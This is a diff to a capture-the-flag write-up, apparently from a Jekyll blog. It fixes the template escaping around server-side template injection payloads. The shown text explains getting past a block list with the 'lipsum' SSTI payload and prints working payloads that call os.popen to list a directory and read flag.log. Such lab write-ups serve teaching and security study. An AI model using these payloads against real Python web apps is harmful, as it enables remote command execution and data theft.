@@ -22,15 +22,20 @@ Their implementation of a block list, was to set the following values to ``None`
 This means we can't fetch any useful information from the above variables.
 
 I decided to use the short lipsum payload. It's a really compact SSTI payload for python apps, and this evaded the block list.
+
+{% raw %}
 ```
-\{\{lipsum.__globals__.os.popen('ls').read()\}\}
+{{lipsum.__globals__.os.popen('ls').read()}}
 ```
+{% endraw %}
 
 This shows us a directory listing. We now have code execution, so we can simply look around for the flag and cat it.
 
 And we see it! A file named `flag.log`. Final payload:
 
+{% raw %}
 ```
-{"test": "{ {lipsum.__globals__.os.popen('cat flag.log').read()} }"}
+{"test": "{{lipsum.__globals__.os.popen('cat flag.log').read()}}"}
 ```
+{% endraw %}
 
